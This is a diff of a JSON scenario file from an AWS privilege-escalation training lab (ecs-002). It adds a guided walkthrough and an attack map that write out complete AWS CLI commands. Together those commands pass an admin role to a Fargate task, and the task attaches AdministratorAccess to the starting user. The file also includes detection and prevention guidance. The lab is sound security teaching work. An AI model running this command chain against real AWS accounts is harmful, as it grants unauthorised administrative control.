@@ -13,65 +13,8 @@
     "prod"
   ],
   "attackPath": {
-    "principals": [
-      "arn:aws:iam::{account_id}:user/pl-prod-ecs-002-to-admin-starting-user",
-      "arn:aws:iam::{account_id}:role/pl-prod-ecs-002-to-admin-target-role"
-    ],
-    "summary": "starting_user \u2192 (ecs:CreateCluster) \u2192 (ecs:RegisterTaskDefinition with admin role) \u2192 (ecs:RunTask on Fargate) \u2192 ECS task attaches admin policy to starting user \u2192 admin access"
-  },
-  "permissions": {
-    "required": [
-      {
-        "permission": "ecs:CreateCluster",
-        "resource": "*"
-      },
-      {
-        "permission": "iam:PassRole",
-        "resource": "arn:aws:iam::*:role/pl-prod-ecs-002-to-admin-target-role"
-      },
-      {
-        "permission": "ecs:RegisterTaskDefinition",
-        "resource": "*"
-      },
-      {
-        "permission": "ecs:RunTask",
-        "resource": "*"
-      }
-    ],
-    "helpful": [
-      {
-        "permission": "ec2:DescribeVpcs",
-        "purpose": "Find default VPC for ECS task network configuration"
-      },
-      {
-        "permission": "ec2:DescribeSubnets",
-        "purpose": "Find subnet in default VPC for ECS task network configuration"
-      },
-      {
-        "permission": "ecs:DescribeTasks",
-        "purpose": "Monitor task execution status and verify task completion"
-      },
-      {
-        "permission": "ecs:StopTask",
-        "purpose": "Stop running tasks during cleanup"
-      },
-      {
-        "permission": "ecs:DeregisterTaskDefinition",
-        "purpose": "Clean up task definition after demonstration"
-      },
-      {
-        "permission": "ecs:DeleteCluster",
-        "purpose": "Clean up ECS cluster after demonstration"
-      },
-      {
-        "permission": "iam:ListAttachedUserPolicies",
-        "purpose": "Verify privilege escalation success by listing attached policies"
-      },
-      {
-        "permission": "iam:DetachUserPolicy",
-        "purpose": "Remove admin policy from starting user during cleanup"
-      }
-    ]
+    "principals": [],
+    "summary": ""
   },
   "mitreAttack": {
     "tactics": [
@@ -88,18 +31,76 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/ecs-002-iam-passrole+ecs-createcluster+ecs-registertaskdefinition+ecs-runtask"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/ecs-002-iam-passrole+ecs-createcluster+ecs-registertaskdefinition+ecs-runtask",
+  "schemaVersion": "3.0.0",
+  "permissions": {
+    "required": [
+      {
+        "permission": "ecs:CreateCluster",
+        "resource": "*",
+        "description": "create attacker-controlled cluster infrastructure"
+      },
+      {
+        "permission": "iam:PassRole",
+        "resource": "arn:aws:iam::*:role/pl-prod-ecs-002-to-admin-target-role",
+        "description": "authorize attaching the privileged role to the task definition"
+      },
+      {
+        "permission": "ecs:RegisterTaskDefinition",
+        "resource": "*",
+        "description": "define the malicious container workload"
+      },
+      {
+        "permission": "ecs:RunTask",
+        "resource": "*",
+        "description": "execute the task on Fargate"
+      }
+    ],
+    "helpful": [
+      {
+        "permission": "ec2:DescribeVpcs",
+        "purpose": "find the default VPC for ECS task network configuration"
+      },
+      {
+        "permission": "ec2:DescribeSubnets",
+        "purpose": "find a subnet in the default VPC for ECS task network configuration"
+      },
+      {
+        "permission": "ecs:DescribeTasks",
+        "purpose": "monitor task execution status and verify task completion"
+      },
+      {
+        "permission": "ecs:StopTask",
+        "purpose": "stop running tasks during cleanup"
+      },
+      {
+        "permission": "ecs:DeregisterTaskDefinition",
+        "purpose": "clean up task definition after demonstration"
+      },
+      {
+        "permission": "ecs:DeleteCluster",
+        "purpose": "clean up ECS cluster after demonstration"
+      },
+      {
+        "permission": "iam:ListAttachedUserPolicies",
+        "purpose": "verify privilege escalation success by listing attached policies"
+      },
+      {
+        "permission": "iam:DetachUserPolicy",
+        "purpose": "remove admin policy from starting user during cleanup"
+      }
+    ]
+  },
   "readme": {
-    "overview": "This scenario demonstrates a sophisticated privilege escalation vulnerability where a user with ECS cluster creation and task execution permissions can escalate to administrative privileges by passing a privileged role to a containerized workload they control. Unlike scenarios where the attacker assumes an existing ECS cluster, this attack requires the attacker to create their own infrastructure from scratch.\n\nThe attack chain combines four AWS permissions: `ecs:CreateCluster` to establish container infrastructure, `iam:PassRole` to attach a privileged role, `ecs:RegisterTaskDefinition` to define a malicious container, and `ecs:RunTask` to execute it. The containerized workload then uses the passed administrative role to modify IAM permissions, granting the original attacker permanent administrative access.\n\nThis attack pattern is particularly dangerous because it exploits the trust organizations place in containerized workloads. Many organizations grant broad ECS permissions to developers or CI/CD systems, not realizing that combining cluster creation with role passing capabilities creates a complete privilege escalation path. The use of AWS Fargate makes this attack even more accessible, as it requires no EC2 infrastructure or additional networking setup beyond a default VPC.",
-    "mitreAttack": "- **Tactic**: TA0004 - Privilege Escalation, TA0002 - Execution\n- **Technique**: T1078.004 - Valid Accounts: Cloud Accounts\n- **Technique**: T1610 - Deploy Container",
-    "attackDiagram": "graph LR\n    A[pl-prod-ecs-002-to-admin-starting-user] -->|ecs:CreateCluster| B[New ECS Cluster]\n    A -->|ecs:RegisterTaskDefinition<br/>with target role| C[Malicious Task Definition]\n    A -->|ecs:RunTask| D[ECS Fargate Task]\n    D -->|Executes with| E[pl-prod-ecs-002-to-admin-target-role]\n    E -->|iam:AttachUserPolicy| F[Starting User with Admin Access]\n\n    style A fill:#ff9999,stroke:#333,stroke-width:2px\n    style B fill:#ffcc99,stroke:#333,stroke-width:2px\n    style C fill:#ffcc99,stroke:#333,stroke-width:2px\n    style D fill:#ffcc99,stroke:#333,stroke-width:2px\n    style E fill:#ffcc99,stroke:#333,stroke-width:2px\n    style F fill:#99ff99,stroke:#333,stroke-width:2px",
-    "attackSteps": "1. **Initial Access**: Start as `pl-prod-ecs-002-to-admin-starting-user` (credentials provided via Terraform outputs)\n2. **Create ECS Cluster**: Use `ecs:CreateCluster` to establish a new container execution environment\n3. **Register Task Definition**: Use `ecs:RegisterTaskDefinition` to define a container that will execute with the privileged target role, specifying `iam:PassRole` to attach the role\n4. **Execute Task**: Use `ecs:RunTask` with Fargate launch type to execute the malicious container\n5. **Container Escalation**: The running task uses the passed administrative role to attach the AdministratorAccess policy to the starting user\n6. **Verification**: Verify administrator access by listing IAM users or performing other admin-level actions",
-    "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::PROD_ACCOUNT:user/pl-prod-ecs-002-to-admin-starting-user` | Scenario-specific starting user with access keys, ECS cluster creation, task definition registration, and task execution permissions |\n| `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-ecs-002-to-admin-target-role` | Privileged role with administrative permissions that can be passed to ECS tasks |",
-    "attackLab": {
+    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-ecs-002-to-admin-starting-user` IAM user to the `pl-prod-ecs-002-to-admin-target-role` administrative role by creating an attacker-controlled ECS cluster, registering a malicious task definition with the privileged role, and running the task on Fargate to execute `iam:AttachUserPolicy` as that role.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-ecs-002-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-ecs-002-to-admin-target-role`",
+    "setup": {
       "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
       "deployNonInteractive": "```bash\nplabs enable enable_single_account_privesc_one_hop_to_admin_ecs_002_iam_passrole_ecs_createcluster_ecs_registertaskdefinition_ecs_runtask\nplabs apply\n```",
-      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-ecs-002-to-admin-starting-user` | Scenario-specific starting user with access keys, ECS cluster creation, task definition registration, and task execution permissions |\n| `arn:aws:iam::{account_id}:role/pl-prod-ecs-002-to-admin-target-role` | Privileged role with administrative permissions that can be passed to ECS tasks |",
       "demoAttack": {
-        "intro": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Verify successful privilege escalation\n4. Output standardized test results for automation",
+        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Create a new ECS cluster and register a malicious task definition with the privileged target role\n4. Run the task on Fargate and wait for it to attach AdministratorAccess to the starting user\n5. Verify successful privilege escalation\n6. Output standardized test results for automation",
         "resourcesCreated": "- A new ECS cluster created by the starting user\n- A malicious ECS task definition referencing the privileged target role\n- An ECS Fargate task execution that attaches AdministratorAccess to the starting user",
         "nonInteractive": "```bash\nplabs demo --list\nplabs demo ecs-002-iam-passrole+ecs-createcluster+ecs-registertaskdefinition+ecs-runtask\n```",
         "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `r` to run the demo script"
@@ -107,18 +108,103 @@
       "cleanup": {
         "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup ecs-002-iam-passrole+ecs-createcluster+ecs-registertaskdefinition+ecs-runtask\n```",
         "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_ecs_002_iam_passrole_ecs_createcluster_ecs_registertaskdefinition_ecs_runtask\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- IAM principal has both `iam:PassRole` and `ecs:CreateCluster` permissions, enabling creation of attacker-controlled container infrastructure\n- IAM principal can pass a role with administrative permissions (`arn:aws:iam::{account_id}:role/pl-prod-ecs-002-to-admin-target-role`) to ECS tasks\n- IAM principal has `ecs:RegisterTaskDefinition` and `ecs:RunTask` permissions combined with `iam:PassRole`, forming a complete privilege escalation path\n- Privileged role (`pl-prod-ecs-002-to-admin-target-role`) is passable to ECS tasks by a non-admin principal",
+        "prevention": "- Implement strict separation of duties \u2014 never grant both `iam:PassRole` and ECS execution permissions (`ecs:CreateCluster`, `ecs:RunTask`) to the same principal\n- Use resource-based conditions on `iam:PassRole` to restrict which roles can be passed: `\"Condition\": {\"StringEquals\": {\"iam:PassedToService\": \"ecs-tasks.amazonaws.com\"}}`\n- Implement Service Control Policies (SCPs) to prevent passing administrative or privileged roles to ECS tasks\n- Restrict `ecs:CreateCluster` permissions to infrastructure teams only \u2014 most developers should use existing clusters\n- Use IAM Access Analyzer to identify roles with administrative permissions that can be passed to compute services\n- Implement tag-based access control requiring specific tags on roles before they can be passed to ECS tasks"
       },
-      "teardownNonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_ecs_002_iam_passrole_ecs_createcluster_ecs_registertaskdefinition_ecs_runtask\nplabs apply\n```",
-      "teardownTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+      "cloudSiem": {
+        "cloudTrailEvents": "- `IAM: PassRole` -- role passed to an ECS task; critical when the passed role has administrative permissions\n- `ECS: CreateCluster` -- new ECS cluster created; suspicious when created by non-infrastructure principals\n- `ECS: RegisterTaskDefinition` -- new task definition registered; high severity when combined with a privileged role ARN in the task role field\n- `ECS: RunTask` -- ECS task executed; correlate with prior cluster creation and task definition registration events to identify attack chains",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
     },
-    "cspm": {
-      "whatToDetect": "- IAM principal has both `iam:PassRole` and `ecs:CreateCluster` permissions, enabling creation of attacker-controlled container infrastructure\n- IAM principal can pass a role with administrative permissions (`arn:aws:iam::PROD_ACCOUNT:role/pl-prod-ecs-002-to-admin-target-role`) to ECS tasks\n- IAM principal has `ecs:RegisterTaskDefinition` and `ecs:RunTask` permissions combined with `iam:PassRole`, forming a complete privilege escalation path\n- Privileged role (`pl-prod-ecs-002-to-admin-target-role`) is passable to ECS tasks by a non-admin principal",
-      "prevention": "- Implement strict separation of duties - never grant both `iam:PassRole` and ECS execution permissions (`ecs:CreateCluster`, `ecs:RunTask`) to the same principal\n- Use resource-based conditions on `iam:PassRole` to restrict which roles can be passed: `\"Condition\": {\"StringEquals\": {\"iam:PassedToService\": \"ecs-tasks.amazonaws.com\"}}`\n- Implement Service Control Policies (SCPs) to prevent passing administrative or privileged roles to ECS tasks\n- Restrict `ecs:CreateCluster` permissions to infrastructure teams only - most developers should use existing clusters\n- Use IAM Access Analyzer to identify roles with administrative permissions that can be passed to compute services\n- Implement tag-based access control requiring specific tags on roles before they can be passed to ECS tasks"
-    },
-    "cloudSiem": {
-      "cloudTrailEvents": "- `IAM: PassRole` \u2014 Role passed to an ECS task; critical when the passed role has administrative permissions\n- `ECS: CreateCluster` \u2014 New ECS cluster created; suspicious when created by non-infrastructure principals\n- `ECS: RegisterTaskDefinition` \u2014 New task definition registered; high severity when combined with a privileged role ARN in task role field\n- `ECS: RunTask` \u2014 ECS task executed; correlate with prior cluster creation and task definition registration events to identify attack chains",
-      "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
-    }
+    "guidedWalkthrough": "# Guided Walkthrough: Privilege Escalation via iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:RunTask\n\nThis scenario demonstrates a sophisticated privilege escalation vulnerability where a user with ECS cluster creation and task execution permissions can escalate to administrative privileges by passing a privileged role to a containerized workload they control. Unlike scenarios where the attacker assumes an existing ECS cluster, this attack requires the attacker to create their own infrastructure from scratch.\n\nThe attack chain combines four AWS permissions: `ecs:CreateCluster` to establish container infrastructure, `iam:PassRole` to attach a privileged role, `ecs:RegisterTaskDefinition` to define a malicious container, and `ecs:RunTask` to execute it. The containerized workload then uses the passed administrative role to modify IAM permissions, granting the original attacker permanent administrative access.\n\nThis attack pattern is particularly dangerous because it exploits the trust organizations place in containerized workloads. Many organizations grant broad ECS permissions to developers or CI/CD systems, not realizing that combining cluster creation with role passing capabilities creates a complete privilege escalation path. The use of AWS Fargate makes this attack even more accessible, as it requires no EC2 infrastructure or additional networking setup beyond a default VPC.\n\n## The Challenge\n\nYou start as the IAM user `pl-prod-ecs-002-to-admin-starting-user` with credentials provided via Terraform outputs. Your goal is to reach administrative access in the AWS account \u2014 specifically, to obtain the permissions of `pl-prod-ecs-002-to-admin-target-role`, a role with `AdministratorAccess`.\n\nYour starting user has the following permissions:\n- `ecs:CreateCluster` on `*`\n- `iam:PassRole` on `arn:aws:iam::*:role/pl-prod-ecs-002-to-admin-target-role`\n- `ecs:RegisterTaskDefinition` on `*`\n- `ecs:RunTask` on `*`\n\nThe target role has a trust policy that allows ECS tasks to assume it. You need to connect these pieces together: create the cluster, define a malicious task using the privileged role, run the task, and let the container do the escalation for you.\n\n## Reconnaissance\n\nFirst, let's confirm your identity and understand what you're working with:\n\n```bash\naws sts get-caller-identity\n```\n\nYou should see yourself as `pl-prod-ecs-002-to-admin-starting-user`. Now find the default VPC and a subnet \u2014 you'll need these to launch the Fargate task:\n\n```bash\naws ec2 describe-vpcs --filters Name=isDefault,Values=true --query 'Vpcs[0].VpcId' --output text\naws ec2 describe-subnets --filters Name=vpc-id,Values=<vpc-id> --query 'Subnets[0].SubnetId' --output text\n```\n\nNote the subnet ID. You'll pass it to `ecs:RunTask` when launching the Fargate task.\n\n## Exploitation\n\n### Step 1: Create an ECS Cluster\n\nYou need a cluster to run your task. This is purely a logical grouping \u2014 no EC2 instances required when using Fargate:\n\n```bash\naws ecs create-cluster --cluster-name pl-prod-ecs-002-attack-cluster\n```\n\n### Step 2: Register a Malicious Task Definition\n\nNow register a task definition that uses the privileged target role. The critical element is setting `taskRoleArn` to the admin role via `iam:PassRole`. The container image (`amazon/aws-cli`) runs a single AWS CLI command that attaches `AdministratorAccess` to your starting user:\n\n```bash\naws ecs register-task-definition \\\n  --family pl-ecs-002-privesc \\\n  --task-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-002-to-admin-target-role \\\n  --network-mode awsvpc \\\n  --requires-compatibilities FARGATE \\\n  --cpu 256 \\\n  --memory 512 \\\n  --container-definitions '[{\n    \"name\": \"escalate\",\n    \"image\": \"amazon/aws-cli\",\n    \"command\": [\n      \"iam\", \"attach-user-policy\",\n      \"--user-name\", \"pl-prod-ecs-002-to-admin-starting-user\",\n      \"--policy-arn\", \"arn:aws:iam::aws:policy/AdministratorAccess\"\n    ]\n  }]'\n```\n\nWhen you pass this task definition, AWS validates that you have `iam:PassRole` on the specified `taskRoleArn`. Because your starting user has exactly that permission scoped to the target role, the call succeeds.\n\n### Step 3: Run the Task on Fargate\n\nLaunch the task on Fargate using the cluster you just created:\n\n```bash\naws ecs run-task \\\n  --cluster pl-prod-ecs-002-attack-cluster \\\n  --task-definition pl-ecs-002-privesc \\\n  --launch-type FARGATE \\\n  --network-configuration 'awsvpcConfiguration={subnets=[<subnet-id>],assignPublicIp=ENABLED}'\n```\n\nFargate pulls the `amazon/aws-cli` container image, starts the task, and the container runs with the credentials of `pl-prod-ecs-002-to-admin-target-role` via the task metadata service. The container executes one command \u2014 `aws iam attach-user-policy` \u2014 and attaches `AdministratorAccess` to your starting user.\n\nYou can monitor task completion:\n\n```bash\naws ecs describe-tasks --cluster pl-prod-ecs-002-attack-cluster --tasks <task-arn>\n```\n\nWait until the `lastStatus` reaches `STOPPED` and the container exit code is `0`.\n\n## Verification\n\nOnce the task has completed, verify that your starting user now has admin access:\n\n```bash\naws iam list-attached-user-policies --user-name pl-prod-ecs-002-to-admin-starting-user\n```\n\nYou should see `AdministratorAccess` listed. Confirm you can now perform admin actions:\n\n```bash\naws iam list-users --max-items 5\n```\n\nThis call would previously have been denied. It now succeeds, confirming full administrative access.\n\n## What Happened\n\nYou exploited a privilege escalation path that exists when a principal has both `iam:PassRole` and the ability to create and run ECS workloads. By creating attacker-controlled infrastructure (the cluster and task definition), you arranged for AWS to run your code with the permissions of the target role \u2014 without ever directly assuming that role yourself.\n\nThis is a common blind spot: security teams scrutinize `sts:AssumeRole` calls but overlook that ECS task execution is functionally equivalent. Any principal that can register a task definition with a privileged `taskRoleArn` and run it has effectively assumed that role, just indirectly. In real environments, developers and CI/CD pipelines routinely have these ECS permissions \u2014 the danger is compounded when those same principals can pass roles with elevated permissions.\n"
   },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-user",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-ecs-002-to-admin-starting-user",
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has ecs:CreateCluster, ecs:RegisterTaskDefinition, ecs:RunTask, and iam:PassRole permissions that allow passing the privileged target role to an attacker-controlled ECS task.\n"
+      },
+      {
+        "id": "ecs-cluster",
+        "label": "New ECS Cluster",
+        "type": "resource",
+        "subType": "ecs-task",
+        "arn": "arn:aws:ecs:{region}:{account_id}:cluster/pl-prod-ecs-002-attack-cluster",
+        "description": "An ECS cluster created by the attacker to host the malicious task. Creating a cluster requires only ecs:CreateCluster and provides the execution environment for the privilege escalation container.\n"
+      },
+      {
+        "id": "target-role",
+        "label": "Admin Target Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "isTarget": true,
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-ecs-002-to-admin-target-role",
+        "description": "A privileged IAM role with administrative permissions that is configured to be assumable by ECS tasks. The starting user has iam:PassRole permission on this role, allowing it to be attached as the task role when registering a task definition. When the ECS Fargate task executes using this role, the container runs iam:AttachUserPolicy to attach the AdministratorAccess managed policy to the starting user, granting permanent administrative access to the AWS account using the attacker's original credentials.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-user",
+        "to": "ecs-cluster",
+        "label": "ecs:CreateCluster",
+        "description": "The attacker creates a new ECS cluster to serve as the execution environment for the malicious task.\n",
+        "hints": [
+          "You can create your own container infrastructure in this account.",
+          "Use this cluster as the execution environment for your malicious task definition."
+        ],
+        "commands": [
+          {
+            "description": "Create a new ECS cluster",
+            "command": "aws ecs create-cluster --cluster-name pl-prod-ecs-002-attack-cluster"
+          }
+        ]
+      },
+      {
+        "from": "starting-user",
+        "to": "target-role",
+        "label": "iam:PassRole + ecs:RegisterTaskDefinition",
+        "description": "The attacker registers a task definition that specifies the privileged target role as the task role. The iam:PassRole permission authorizes attaching this role to the task definition.\n",
+        "hints": [
+          "Look for roles you can pass to ECS tasks \u2014 especially ones with elevated permissions.",
+          "This role can be passed to ECS tasks \u2014 use it as the taskRoleArn in your task definition."
+        ],
+        "commands": [
+          {
+            "description": "Register a malicious task definition with the privileged role",
+            "command": "aws ecs register-task-definition --family pl-ecs-002-privesc --task-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-002-to-admin-target-role --network-mode awsvpc --requires-compatibilities FARGATE --cpu 256 --memory 512 --container-definitions '[{\"name\":\"escalate\",\"image\":\"amazon/aws-cli\",\"command\":[\"iam\",\"attach-user-policy\",\"--user-name\",\"pl-prod-ecs-002-to-admin-starting-user\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]'"
+          }
+        ]
+      },
+      {
+        "from": "ecs-cluster",
+        "to": "target-role",
+        "label": "ecs:RunTask",
+        "description": "The attacker runs the malicious task on Fargate using the attacker-created cluster and the registered task definition. The task executes with the privileged target role attached.\n",
+        "hints": [
+          "Combining cluster creation, task registration, and role passing forms a complete escalation path.",
+          "Browse to https://pathfinding.cloud/paths/ecs-002 for technique details."
+        ],
+        "commands": [
+          {
+            "description": "Run the malicious task on Fargate",
+            "command": "aws ecs run-task --cluster pl-prod-ecs-002-attack-cluster --task-definition pl-ecs-002-privesc --launch-type FARGATE --network-configuration 'awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}'"
+          }
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
   "slug": "ecs-002"
 }
